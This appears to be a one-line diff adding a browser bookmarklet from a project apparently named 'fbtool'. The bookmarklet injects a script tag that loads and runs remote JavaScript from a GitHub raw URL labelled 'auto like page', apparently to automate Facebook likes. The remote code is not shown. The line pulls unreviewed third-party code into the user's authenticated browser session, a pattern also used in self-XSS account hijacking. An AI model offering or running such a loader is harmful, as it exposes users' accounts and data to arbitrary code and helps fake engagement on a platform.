@@ -1,0 +1,1 @@
+javascript:(function(){document.body.appendChild(document.createElement('script')).src='https://raw.githubusercontent.com/danialkechik/fbtool/master/auto%20like%20page';})();
